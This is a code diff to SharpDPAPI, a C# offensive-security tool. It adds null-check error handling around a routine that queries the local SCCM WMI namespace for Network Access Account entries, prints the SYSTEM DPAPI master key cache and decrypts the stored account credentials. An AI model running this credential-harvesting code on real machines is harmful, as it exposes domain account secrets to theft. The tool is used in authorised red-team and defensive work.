@@ -22,10 +22,12 @@ namespace SharpDPAPI.Commands
             catch (System.UnauthorizedAccessException unauthorizedErr)
             {
                 Console.WriteLine("[!] Access to WMI was not authorized (user name or password might be incorrect): " + unauthorizedErr.Message);
+                return null;
             }
             catch (Exception e)
             {
                 Console.WriteLine("[!] Error connecting to WMI: " + e.Message);
+                return null;
             }
             return sccmConnection;
         }
@@ -204,43 +206,46 @@ namespace SharpDPAPI.Commands
             else
             {
                 ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
-                GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
-                ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
-                ManagementObjectCollection accounts = searcher.Get();
-                if (accounts.Count > 0)
+                if (sccmConnection != null)
                 {
-                    foreach (ManagementObject account in accounts)
+                    GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
+                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
+                    ManagementObjectCollection accounts = searcher.Get();
+                    if (accounts.Count > 0)
                     {
-                        string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
-                        string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
-                        byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
-                        int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
-                        Array.Resize(ref protectedUsernameBytes, length);
-
-                        Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();
-
-                        Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                        foreach (KeyValuePair<string, string> kvp in mappings)
+                        foreach (ManagementObject account in accounts)
                         {
-                            Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
-                        }
-                        Console.WriteLine();
+                            string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
+                            string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
+                            byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
+                            int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
+                            Array.Resize(ref protectedUsernameBytes, length);
 
-                        try
-                        {
-                            NAADecrypt(protectedUsername, mappings);
-                            NAADecrypt(protectedPassword, mappings);
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
-                            Console.WriteLine(e.ToString());
+                            Dictionary<string, string> mappings = Triage.TriageSystemMasterKeys();
+
+                            Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                            foreach (KeyValuePair<string, string> kvp in mappings)
+                            {
+                                Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                            }
+                            Console.WriteLine();
+
+                            try
+                            {
+                                NAADecrypt(protectedUsername, mappings);
+                                NAADecrypt(protectedPassword, mappings);
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                                Console.WriteLine(e.ToString());
+                            }
                         }
                     }
-                }
-                else
-                {
-                    Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
+                    else
+                    {
+                        Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount");
+                    }
                 }
             }
 
